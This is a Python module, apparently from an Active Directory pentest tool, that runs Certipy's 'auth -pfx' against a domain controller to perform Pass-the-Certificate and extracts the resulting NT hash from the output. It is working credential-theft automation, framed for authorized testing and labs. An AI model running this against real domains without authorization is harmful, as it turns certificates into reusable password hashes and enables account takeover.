"""Certipy-based Pass-the-Certificate service.

This module encapsulates the logic required to perform a "Pass the
Certificate" operation using Certipy. The goal is to keep subprocess
command construction, execution, and output parsing out of the CLI
monolith in ``adscan.py`` so that:

* The core behaviour can be tested in isolation.
* Future frontends (e.g. a web backend) can reuse the same logic.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Optional
import subprocess
import re
import shlex

from adscan_internal.core import EventBus, LicenseMode
from adscan_internal.command_runner import (
    CommandRunner,
    CommandSpec,
    build_execution_output_preview,
    summarize_execution_result,
)
from adscan_internal.execution_outcomes import (
    output_has_timeout_marker,
    result_is_timeout,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.base_service import BaseService
from adscan_internal import print_error, print_info_debug, print_instruction
from adscan_internal.subprocess_env import (
    command_string_needs_clean_env,
    get_clean_env_for_compilation,
)


_CERTIPY_LAB_PADATA_NOSUPP_TOKENS: tuple[str, ...] = (
    "kdc_err_padata_type_nosupp",
    "kdc has no support for padata type",
)


def _certipy_output_indicates_lab_padata_nosupp(output: str) -> bool:
    """Return True when Certipy hit the known lab/CA PKINIT failure."""
    lowered = output.lower()
    return any(token in lowered for token in _CERTIPY_LAB_PADATA_NOSUPP_TOKENS)


def _build_certipy_lab_padata_nosupp_message() -> str:
    """Return a user-facing explanation for the PKINIT padata lab failure."""
    return (
        "Certipy Pass-the-Certificate hit KDC_ERR_PADATA_TYPE_NOSUPP. "
        "This usually indicates a broken lab/CA PKINIT state rather than an issue "
        "with the certificate itself. Restart the lab or the affected CA/KDC services "
        "and retry."
    )


@dataclass
class PassTheCertificateResult:
    """Result of a Certipy Pass-the-Certificate operation.

    Attributes:
        domain: Target AD domain.
        principal: Full principal string reported by Certipy (e.g. ``user@dom``).
        username: Parsed username component.
        resolved_domain: Parsed domain component (from principal or fallback
            to ``domain`` argument).
        nt_hash: Extracted NT hash (if any).
        raw_output: Combined stdout/stderr from Certipy.
        success: Whether the operation appears to have succeeded.
        error_message: Optional human-readable error description.
    """

    domain: str
    principal: Optional[str]
    username: Optional[str]
    resolved_domain: Optional[str]
    nt_hash: Optional[str]
    raw_output: str
    success: bool
    error_message: Optional[str] = None


class CertipyService(BaseService):
    """Service responsible for Certipy-driven Pass-the-Certificate operations."""

    def __init__(
        self,
        event_bus: Optional[EventBus] = None,
        license_mode: LicenseMode = LicenseMode.PRO,
    ):
        """Initialize CertipyService."""
        super().__init__(event_bus=event_bus, license_mode=license_mode)
        self._command_runner = CommandRunner()

    def pass_the_certificate(
        self,
        *,
        certipy_path: str,
        domain: str,
        pdc_ip: str,
        pfx_file: str,
        pfx_password: Optional[str] = None,
        username: Optional[str] = None,
        timeout: int = 300,
        shell: Any | None = None,
    ) -> PassTheCertificateResult:
        """Run Certipy ``auth -pfx`` and parse the resulting NT hash.

        Args:
            certipy_path: Path to the ``certipy`` executable.
            domain: Target AD domain.
            pdc_ip: Domain controller IP address.
            pfx_file: Path to the PFX file.
            pfx_password: Optional PFX password.
            username: Optional username to pass to Certipy auth for
                certificates without embedded identity/UPN.
            timeout: Command timeout in seconds.
            shell: Optional shell instance that provides ``run_command``. When
                provided, this uses the centralized command runner (consistent
                output/logging/clean env) instead of raw ``subprocess.run``.

        Returns:
            PassTheCertificateResult with parsed principal and NT hash.
        """
        cmd_parts: list[str] = [certipy_path, "auth", "-pfx", pfx_file]
        if pfx_password:
            cmd_parts.extend(["-password", pfx_password])
        if username:
            cmd_parts.extend(["-username", username, "-domain", domain])
        cmd_parts.extend(["-dc-ip", pdc_ip])
        command = "echo 'y' | " + " ".join(shlex.quote(part) for part in cmd_parts)

        debug_parts: list[str] = [
            certipy_path,
            "auth",
            "-pfx",
            mark_sensitive(pfx_file, "path"),
        ]
        if pfx_password:
            debug_parts.extend(["-password", mark_sensitive(pfx_password, "password")])
        if username:
            debug_parts.extend(
                [
                    "-username",
                    mark_sensitive(username, "user"),
                    "-domain",
                    mark_sensitive(domain, "domain"),
                ]
            )
        debug_parts.extend(["-dc-ip", mark_sensitive(pdc_ip, "ip")])
        debug_command = "echo 'y' | " + " ".join(
            shlex.quote(part) for part in debug_parts
        )

        print_info_debug(f"[certipy] Running Pass-the-Certificate: {debug_command}")

        try:
            completed: subprocess.CompletedProcess[str] | None
            if shell is not None and hasattr(shell, "run_command"):
                completed = shell.run_command(command, timeout=timeout)
            else:
                env = (
                    get_clean_env_for_compilation()
                    if command_string_needs_clean_env(command)
                    else None
                )
                completed = self._command_runner.run(
                    CommandSpec(
                        command=command,
                        timeout=timeout,
                        shell=True,
                        capture_output=True,
                        text=True,
                        check=False,
                        env=env,
                    )
                )
        except subprocess.TimeoutExpired as exc:
            output = (exc.stdout or "") + (exc.stderr or "")
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output=output,
                success=False,
                error_message="Certipy auth command timed out",
            )
        except Exception as exc:  # noqa: BLE001
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output="",
                success=False,
                error_message=str(exc),
            )

        if completed is None:
            # Central command runner returns None on timeout/errors; it stores context on the shell.
            last_error = getattr(shell, "_last_run_command_error", None) if shell else None
            err_kind = last_error[0] if last_error else "error"
            if err_kind == "timeout":
                err_msg = (
                    "Certipy auth command timed out before completion. "
                    "Verify VPN/network connectivity to the target and retry."
                )
                print_instruction(
                    "Verify VPN/network connectivity to the target and retry."
                )
            else:
                err_msg = (
                    f"Certipy auth command failed before completion ({err_kind})."
                    if err_kind
                    else "Certipy auth command failed before completion."
                )
            print_error(err_msg)
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output="",
                success=False,
                error_message=err_msg,
            )

        if result_is_timeout(completed, tool_name="certipy"):
            timeout_error = (
                "Certipy auth command timed out. Verify VPN/network connectivity to the target and retry."
            )
            print_error(timeout_error)
            print_instruction("Verify VPN/network connectivity to the target and retry.")
            output = (completed.stdout or "") + (completed.stderr or "")
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output=output,
                success=False,
                error_message=timeout_error,
            )

        exit_code, stdout_count, stderr_count, duration_text = summarize_execution_result(
            completed
        )
        print_info_debug(
            "[certipy] Result: "
            f"exit_code={exit_code}, stdout_lines={stdout_count}, "
            f"stderr_lines={stderr_count}, duration={duration_text}"
        )
        preview = build_execution_output_preview(completed)
        if preview:
            print_info_debug(f"[certipy] Output preview:\n{preview}", panel=True)

        output = (completed.stdout or "") + (completed.stderr or "")
        if output_has_timeout_marker(output):
            timeout_error = (
                "Certipy auth command timed out. Verify VPN/network connectivity to the target and retry."
            )
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output=output,
                success=False,
                error_message=timeout_error,
            )

        if _certipy_output_indicates_lab_padata_nosupp(output):
            lab_error = _build_certipy_lab_padata_nosupp_message()
            print_error(lab_error)
            print_instruction(
                "Restart the lab or the affected CA/KDC services, then retry the Pass-the-Certificate step."
            )
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output=output,
                success=False,
                error_message=lab_error,
            )

        # Parse NT hash using the same pattern as the legacy implementation.
        match = re.search(
            r"Got hash for ['\"]?([^'\"]+)['\"]?:\s*([0-9a-f:]+)",
            output,
            re.IGNORECASE,
        )
        if not match:
            identity_error = None
            if re.search(r"Could not find identity", output, re.IGNORECASE) or re.search(
                r"Username or domain is not specified", output, re.IGNORECASE
            ):
                identity_error = "Certipy could not resolve identity from the certificate"
            return PassTheCertificateResult(
                domain=domain,
                principal=None,
                username=None,
                resolved_domain=None,
                nt_hash=None,
                raw_output=output,
                success=False,
                error_message=identity_error
                or "Could not extract NT hash from Certipy output",
            )

        principal = match.group(1)
        hash_combo = match.group(2)
        nt_hash = hash_combo.split(":")[-1]

        if "@" in principal:
            username, resolved_domain = principal.split("@", 1)
        else:
            username = principal
            resolved_domain = domain

        return PassTheCertificateResult(
            domain=domain,
            principal=principal,
            username=username,
            resolved_domain=resolved_domain,
            nt_hash=nt_hash,
            raw_output=output,
            success=True,
        )


__all__ = ["CertipyService", "PassTheCertificateResult"]
